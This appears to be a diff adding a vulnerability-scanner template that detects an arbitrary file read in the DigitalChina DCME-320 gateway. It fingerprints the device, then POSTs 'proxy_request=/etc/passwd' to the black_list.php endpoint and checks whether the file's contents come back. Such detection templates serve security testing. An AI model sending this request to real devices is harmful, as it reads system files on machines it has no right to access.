@@ -1,0 +1,39 @@
+id: poc-digitalchina-dcme-320-eg-black-list-php-anyfile-read
+info:
+  name: "DigitalChina DCME-320 Gateway black_list.php Arbitrary File Read"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    This template detects an arbitrary file read vulnerability in the DigitalChina DCME-320 Gateway via the black_list.php endpoint.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "style/blue/css/dcn_ui.css"
+  - method: POST
+    path:
+      - "{{BaseURL}}/function/auth/user/black_list.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "proxy_request=/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "root"
+          - "/bin"
+      - type: word
+        words:
+          - "<"
+        negative: true
